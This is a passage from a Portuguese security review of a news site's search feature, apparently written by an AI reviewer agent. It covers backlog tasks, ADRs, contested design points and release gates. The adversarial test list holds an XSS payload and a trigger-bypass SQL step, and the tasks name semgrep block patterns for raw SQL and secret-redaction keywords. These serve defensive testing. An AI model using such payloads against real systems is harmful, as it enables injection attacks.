- **Task**: **T30.4.X11** "SearchView adiciona `X-Robots-Tag: noindex, nofollow` em response; configurar `Permissions-Policy` no middleware global se ainda não presente" — ⚪ Low.

#### **L-06 — Cache hit revela header `X-Cache: HIT`? Versão Django?**

- Django por default não envia `Server: Django`. Confirmar `nginx` config não envia `Server: nginx/1.X` versão.
- **Task**: **TX-24** "Auditar headers de produção (`curl -I https://interpop.com.br`) e remover `Server` versão; documentar em `docs/ops/nginx-hardening.md`" — ⚪ Low.

#### **L-07 — Audit de busca em `apps.audit` ou isolado?**

- DESIGN open question #9. Recomendação: **NÃO auditar todas as buscas em `apps.audit`** — viola minimização LGPD (auditoria é para ações privilegiadas, busca é leitura pública). Auditar APENAS eventos de abuso (rate limit hit, 503, queries cursor inválido) com retention 30d em `apps.audit` (forensics) — SEM query content, SEM IP — só `event_type, user_id (se logado), timestamp`.
- **Task**: **T30.4.X12** "Audit log em `apps.audit` para eventos: `search_rate_limit_exceeded`, `search_cursor_invalid`, `search_503_overload`. Sem query content. Retention 30d (já é padrão do apps.audit)" — ⚪ Low.

---

## §4. Tasks novas para BACKLOG

> Convenção: padrão `T30.4.X*` para tasks ligadas a US30.4 (controle/segurança) e `TX-NN` para transversais. Sem infinitivo, pt-BR direto.

### 🔴 Immediate (entrar antes do PR final da US30.1)

| ID           | Título                                                                                                                                                                                                                                           | Vincula | Origem          |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------- | --------------- |
| **T30.4.X1** | Sanitização do parâmetro `q` no SearchQuerySerializer (whitelist alfanumérico + acentuado + espaço + hífen; rejeição de chars HTML com 400) e escape de `query_terms_expanded` no service + comment-lock anti-`innerHTML` em `<HighlightedText>` | H-01    | Security review |

### 🟠 High (entrar no Sprint 4 ou início do Sprint 5)

| ID           | Título                                                                                                                                                                                 | Vincula    | Origem          |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------- | --------------- |
| **T30.4.X2** | Refinamento do `search_log`: bucket timestamp 5min + HMAC-pepper no `query_hash` + IP `/16` (ou eliminação de IP em favor apenas de `user_hash`) + documentação de base legal LGPD     | H-02       | Security review |
| **T30.4.X3** | Throttle global do endpoint de busca (`SearchGlobalThrottle scope='search_global' rate='500/min'`) somado às throttles de tier                                                         | H-03       | Security review |
| **T30.4.X4** | Cache key inclui `auth_tier`, resposta inclui `Vary: Authorization, Cookie`, invariante "resposta não inclui campos personalizados" no SearchView com comment-lock e teste integration | H-04       | Security review |
| **TX-19**    | Inclusão de `search_log` em `--exclude-table-data` do `pg_dump` no runbook DR (alinha com TX-13)                                                                                       | H-02, M-09 | Security review |
| **TX-20**    | Documentação de regras Cloudflare WAF custom para `/api/v1/search/*` (rate limit por ASN + circuit breaker em anomalia)                                                                | H-03       | Security review |
| **TX-21**    | Configuração da role Postgres `interpop_search_reader` com `connection_limit` separado                                                                                                 | H-03       | Security review |

### 🟡 Normal

| ID           | Título                                                                                                                                                   | Vincula | Origem          |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | --------------- |
| **T30.4.X5** | Regra semgrep custom em `.semgrep.yml` bloqueando `extra(where=`, `RawSQL(`, `raw(` em `apps/search/`                                                    | M-01    | Security review |
| **T30.4.X6** | Cursor HMAC com `exp` (TTL 1h) e `kid` (key-id); settings com `SEARCH_CURSOR_HMAC_KEYS` dict de chaves current + previous                                | M-02    | Security review |
| **T30.4.X7** | Trigger `articles_sync_search` declarada como `ENABLE ALWAYS` + cron de auditoria diário (`articles publicado SEM linha em search_index` → alert Sentry) | M-04    | Security review |
| **T30.4.X8** | Cron de purga emite ping em Healthchecks.io; métrica Prometheus `search_log_oldest_seconds`; alert Sentry/Grafana se > 8d                                | M-06    | Security review |
| **T30.4.X9** | `SearchService.query()` aplica `SET LOCAL statement_timeout = '500ms'` por transação (defesa em profundidade independente do role) + test integration    | M-07    | Security review |
| **TX-22**    | Hardening Nginx: aceitar requests apenas de IPs Cloudflare (`set_real_ip_from` + allow/deny)                                                             | M-08    | Security review |
| **TX-23**    | `logging.Filter` que redacta valores de env contendo `SECRET`, `KEY`, `PASSWORD`, `TOKEN` em `apps.audit.logging`                                        | M-10    | Security review |

### ⚪ Low

| ID            | Título                                                                                                                                 | Vincula | Origem          |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ------- | --------------- |
| **T30.4.X10** | `<HighlightedText>` usa `useLayoutEffect` + `instance.unmark()` no cleanup; teste com React 19 strict double-mount                     | L-03    | Security review |
| **T30.4.X11** | SearchView adiciona `X-Robots-Tag: noindex, nofollow`; verifica/adiciona `Permissions-Policy` no middleware global                     | L-05    | Security review |
| **T30.4.X12** | Audit log em `apps.audit` apenas para `search_rate_limit_exceeded`, `search_cursor_invalid`, `search_503_overload` (sem query content) | L-07    | Security review |
| **TX-24**     | Auditoria de headers de produção (`Server` sem versão); documentar em `docs/ops/nginx-hardening.md`                                    | L-06    | Security review |

**Total: 17 tasks novas** (1 🔴 Immediate, 6 🟠 High, 7 🟡 Normal, 4 ⚪ Low — sem T30.4.X10 a TX-24 contadas em ordem)

---

## §5. ADRs novos a propor

> Numeração continua a partir de ADR-034 (último DESIGN v3).

| ID          | Título                                                                                                                                                                          | Razão                            | Camada        |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | ------------- |
| **ADR-035** | Refinamento de pseudonimização do `search_log` (bucket 5min + HMAC-pepper + IP/16 ou drop) com base legal LGPD declarada                                                        | H-02 trata privacy by design     | LGPD / DB     |
| **ADR-036** | Política de cursor HMAC: `exp` 1h + `kid` versionado + rotação semestral com transition window 24h via dict de chaves; uso de `hmac.compare_digest`                             | M-02 trata replay e rotação      | Backend       |
| **ADR-037** | Feature flag `SEARCH_FEATURE_ENABLED` em env: trade-off aceito (alternativa Settings DB rejeitada pelo custo de ida ao DB no boot); audit log de toggle quando via DB no futuro | M-05 documenta decisão           | DevSecOps     |
| **ADR-038** | Cache key inclui `auth_tier` + `Vary: Authorization, Cookie` + invariante de "resposta function-pure de (q, filters, cursor)"                                                   | H-04 trata cross-user cache leak | Backend       |
| **ADR-039** | Estratégia anti-DoS em camadas (DRF tier throttle + DRF global throttle + Cloudflare WAF ASN + connection pool isolation + adaptive degradation)                                | H-03 trata DoS coordenado        | Backend / Ops |

---

## §6. Itens que confirmam o que o DESIGN já tem (cite linha)

Para o `code-implementer` ter clareza do que está aprovado sem reservas:

| Item                                                           | Onde no DESIGN                                                                | Veredito security                                                                                                 |
| -------------------------------------------------------------- | ----------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- | ----- |
| `plainto_tsquery` (não `to_tsquery`)                           | §2.3 linha 249 (`plainto_tsquery`) + Invariante 3 (linha 198 specialist algo) | ✅ Confirmado SQL-injection-safe — `plainto` ignora operadores `&                                                 | !:\*` |
| Cursor HMAC base64                                             | §2.3 ADR-021 confirma; specialist algo §3 linha 92                            | ✅ Aprovado COM ADR-036 (kid + exp)                                                                               |
| Rate limit DRF 30/min anon + 60/min user                       | DESIGN §0 NFR + CA06/CA07 + US30.4                                            | ✅ Aprovado COM T30.4.X3 (global)                                                                                 |
| Trigger SQL = SSOT + signal = cache invalidation               | §2.2 linha 100-130                                                            | ✅ Aprovado COM T30.4.X7 (ENABLE ALWAYS)                                                                          |
| `statement_timeout = '500ms'` no role                          | §2.3 linha 209 (M4) + Invariante 12                                           | ✅ Aprovado COM T30.4.X9 (defesa adicional via SET LOCAL)                                                         |
| Mark.js com refs (não `dangerouslySetInnerHTML`)               | §3.4 linha 438 + specialist UI § "mark.js usa refs"                           | ✅ Aprovado COM comment-lock (parte de T30.4.X1)                                                                  |
| CSP report-only → enforce                                      | Não no DESIGN, mas no projeto (`backend/config/settings/base.py:291`)         | ✅ Existente, aplica-se à busca                                                                                   |
| `<input type="search">` semântico (rejeita combobox APG falso) | §2.6 ADR-028 REV                                                              | ✅ Aprovado — reduz superfície a11y/aria-confusion                                                                |
| LGPD retention 7d via cron                                     | DESIGN §0 NFR + TX-04                                                         | 🟡 Aprovado COM hardening: TX-19 (exclude backup) + T30.4.X8 (alerta de falha) + T30.4.X2 (pseudonimização forte) |
| Single-tenant declarado                                        | §2.2 ADR-033 + linha 178                                                      | ✅ Confirmado — reduz superfície de cross-tenant data leak                                                        |
| Status filter sempre presente (Invariante 4)                   | algorithms specialist §8 inv 4                                                | ✅ Crítico — drafts/agendados não vazam                                                                           |

---

## §7. Itens contestados do DESIGN (anti-sycophancy — sem suavização)

### 7.1 **"LGPD: query plain nunca persistida (hash 16 chars); IP /24; user hash; TTL 7d"** — DESIGN §3.4 linha 437

**Contesto**: a frase implica conformidade LGPD com mecanismos atuais. **Não está.** Hash 64-bit é trivialmente revertível para Zipf head; IP /24 + timestamp seg + user_hash é vetor de correlação. Veja H-02. Se o usuário quiser comunicar conformidade LGPD ao público (consentimento, política de privacidade) **sem** implementar T30.4.X2, **terá problema com ANPD** caso ocorra incidente. Recomendação dura: T30.4.X2 sai do "Normal" e vira "High" no Sprint 4. **Não bloqueio porque LGPD não impede implementação — impede ostentação de conformidade.**

### 7.2 **"Rate limit em 2 camadas: DRF throttle + Cloudflare WAF"** — DESIGN §3.4 linha 436

**Contesto suave**: as duas camadas atacam a mesma classe de ataque (per-IP rate). Botnet distribuído passa pelas duas (cada IP < threshold). H-03 mostra como mitigar. **Não é falha**, é incompleto — `code-implementer` lendo o DESIGN sem essa nota implementaria as duas e iria para produção com falsa sensação de segurança.

### 7.3 **"CSP: mark.js NÃO usa `dangerouslySetInnerHTML` (wrapMatches com refs)"** — DESIGN §3.4 linha 438

**Contesto**: a frase confirma uso atual de mark.js. Mas não tem **mecanismo de proteção** contra um PR futuro que troque mark.js por implementação ad-hoc com `innerHTML`. ESLint `react/no-danger` + comment-lock são as únicas defesas. T30.4.X1 inclui esse comment-lock — sem ele, a garantia decai com o tempo.

### 7.4 **"Cache HTTP `Cache-Control: public, max-age=60, stale-while-revalidate=300`"** — DESIGN §2.4 (preservado v2)

**Contesto forte**: `public` em endpoint com rate-limit por tier é **incoerente**. Cloudflare pode servir resposta cacheada para usuário em rate-limit reached → métricas inconsistentes; ou pior, vazamento de tier (H-04). Se a intenção é cachear no edge, precisa `Vary: Authorization, Cookie` E precisa separar key por tier. Se a intenção é cachear só no browser do usuário, `private, max-age=60` é o correto. **Escolha**: documente em ADR-038. Não há resposta certa sem entender se o ganho de cache no edge vale o risco de leak — mas a configuração atual mistura os mundos.

### 7.5 **"`SEARCH_RECENCY_HALF_LIFE_DAYS = 60` em settings (não literal)"** — Invariante 10 specialist algorithms

**Não é contestação — é elogio**: parametrizar half-life é correto e habilita A/B test sem deploy. Confirmação explícita.

### 7.6 **"Trigger SQL = fonte de verdade da consistência"** — DESIGN §2.2

**Contesto operacional (não security)**: trigger SQL impõe que **toda factory_boy no test crie linha em search_index**. Specialist algorithms já alerta (DESIGN §5 open question #3). Aceitar como feature OK, mas adicionar: factories devem usar `SET session_replication_role = 'replica'` em fixtures específicos — o que reabre M-04. Trade-off: trigger sempre ativo (M-04 mitigado por ENABLE ALWAYS) reduz flexibilidade de testes; vs trigger normal (mais fácil testar) permite bypass. **Recomendação**: ENABLE ALWAYS em produção, ENABLE em dev/test. ADR-040 (opcional) documenta.

### 7.7 **"OpenAPI/`drf-spectacular`: schema público expõe estrutura do `query_terms_expanded`"** — pergunta da brief

**Resposta direta**: aceitável. Não é vulnerabilidade. OpenAPI é documentação por design. L-01.

---

## §8. Open questions para o usuário decidir

> Decisões que precisam input antes do `code-implementer` mergulhar.

1. **Q1 (LGPD)**: o `search_log` é para (a) analytics de queries populares, (b) forensics de abuse, ou (c) ambos? Se (a), aceito reduzir granularidade radical (T30.4.X2 → bucket 1h + só `results_count_bucket`, sem user/IP). Se (b) ou (c), aplicar pseudonimização forte de T30.4.X2.
2. **Q2 (Cache)**: cache no edge Cloudflare é desejável? Se sim, aplicar `Vary` + auth_tier (T30.4.X4). Se não, mudar `Cache-Control: public` → `private` (mais simples, sem ganho de edge). Decisão financeira/UX.
3. **Q3 (Botnet)**: nível de defesa contra DoS distribuído coordenado é proporcional ao perfil de ameaça do Interpop. **Pergunta**: o projeto espera ser alvo (concorrência editorial brasileira com histórico de DDoS — Folha 2014, UOL 2020, etc.) ou é cenário hipotético? Resposta calibra esforço de TX-20/TX-21.
4. **Q4 (Audit)**: confirmação — quer auditar buscas no `apps.audit`? Minha recomendação (L-07): **não** auditar conteúdo de busca; auditar apenas eventos de abuso. Confirmar.
5. **Q5 (CSP)**: o CSP do projeto está em report-only (`base.py:291`). Quando vira enforce? Se busca lança antes de enforce, qualquer regressão de CSP em outro PR não bloqueia mark.js — risco aceito ou prioridade?
6. **Q6 (Vault)**: secret manager (HashiCorp Vault, Doppler, AWS Secrets Manager) está no roadmap? Se não, M-10 fica como "aceito"; se sim, encaixar pós-Sprint 6.
7. **Q7 (`exp` no cursor)**: TTL de 1h no cursor é UX-aceitável? Cursor expirado → 400 + frontend re-faz query inicial → perde scroll position. Trade-off entre security e UX.
8. **Q8 (Cloudflare bypass M-08)**: hardening do origin (aceitar só IPs Cloudflare) é tarefa **transversal ao projeto**, não específica da busca. Quer tratar agora (motivada pela busca) ou criar issue separada para o roadmap de hardening de infraestrutura?

---

## §9. Handoff ao `code-implementer`

### ANTES de começar (ordem obrigatória)

1. **Ler** este SECURITY-REVIEW.md inteiro. Não é opcional — `code-implementer` que pula security review entrega vulnerabilidade.
2. **Confirmar** com o usuário as 8 open questions de §8 (especialmente Q1, Q2, Q3). Sem essas respostas, parte da implementação fica em terreno cinza.
3. **Adicionar ao BACKLOG.md** (próxima sessão do `documentation-engineer` ou main loop) as 17 Tasks de §4, mantendo numeração T30.4.X1–X12 + TX-19–TX-24.
4. **Materializar** ADR-035, ADR-036, ADR-037, ADR-038, ADR-039 antes do PR da US30.1 (pode ser em PR separado ou no mesmo PR conforme convenção do projeto).

### DURANTE a implementação

5. **Implementar T30.4.X1 JUNTO de T30.1.8** (`SearchQuerySerializer`). Não deixar para depois — sanitização é parte do mesmo serializer. Risco: dev faz serializer sem whitelist, faz PR, esquece T30.4.X1, merge.
6. **Implementar T30.4.X4 JUNTO de T30.1.24** (`Cache-Control` setup). Mesma justificativa.
7. **Aplicar comment-locks** literais nestes lugares:
   - `apps/search/services.py` perto de `cursor.execute`: `# SECURITY: queries DEVEM usar parametrização. NÃO usar .extra(where=) ou RawSQL. Ver SECURITY-REVIEW.md M-01.`
   - `apps/search/views.py` perto da response: `# SECURITY: response é function-pure de (q, filters, cursor). NÃO adicionar campos por-usuário (bookmarked, read). Cache compartilhado entre tiers. Ver SECURITY-REVIEW.md H-04.`
   - `src/pages/Buscar/components/HighlightedText.tsx` topo: `// SECURITY: mark.js usa refs. NUNCA use dangerouslySetInnerHTML aqui. Ver SECURITY-REVIEW.md H-01.`
8. **Testes adversariais obrigatórios** antes de merge (parte de T30.1.11/T30.1.12):
   - `q = "<script>alert(1)</script>"` → 400 OU 200 com `query_terms_expanded` 100% escape.
   - Cursor flipped 1-bit → 400 (não 500, não 200).
   - 31 reqs em 60s mesmo IP → 31º 429.
   - 31 reqs em 60s com 31 IPs diferentes mesmo `q` patológico → backend ainda responde em <2s p95 (T30.4.X3 + T30.4.X9 em ação).
   - Cliente A logado + Cliente B anônimo mesma query → headers `Vary` diferentes E cache hit não compartilha (T30.4.X4).
   - `SET session_replication_role = 'replica'`; INSERT artigo; SELECT search_index → linha presente (T30.4.X7).

### DEPOIS de implementar (gates de release)

9. **Não merge** sem:
   - [ ] T30.4.X1 implementada e testada.
   - [ ] T30.4.X3 implementada (throttle global).
   - [ ] T30.4.X4 implementada (cache key + Vary).
   - [ ] T30.4.X2 implementada (LGPD pseudonim. forte) — ou justificativa documentada se Q1 = (a) "só analytics agregado".
   - [ ] ADR-035 a ADR-039 materializados.
   - [ ] Semgrep custom (T30.4.X5) ativo no CI.
   - [ ] Lighthouse CI passa (TX-16) E `npm audit --production` sem vulnerabilidades High/Critical.
   - [ ] Smoke test em staging: cenário "atacante adversarial" do passo 8 acima rodado manualmente uma vez.

10. **Pós-merge / pós-deploy**:
    - Monitorar `search_log_oldest_seconds` (T30.4.X8) por 7 dias antes de declarar GA.
    - Sentry alert para `search_rate_limit_exceeded` > 100/h (sinal de ataque).
    - Re-revisar este SECURITY-REVIEW.md em 90 dias (cron mental).

---

**Fim do SECURITY-REVIEW.md** — 17 achados, 17 tasks, 5 ADRs, 8 open questions. `code-implementer` está liberado para fase 1 + fase 2 do DESIGN §6, observando os locks acima.

**Reviewer signature**: cyber-security-architect (sócio sênior — Gabarito aplicado)
**Próximo handoff**: `documentation-engineer` materializa ADRs + main-loop adiciona tasks ao BACKLOG.md.
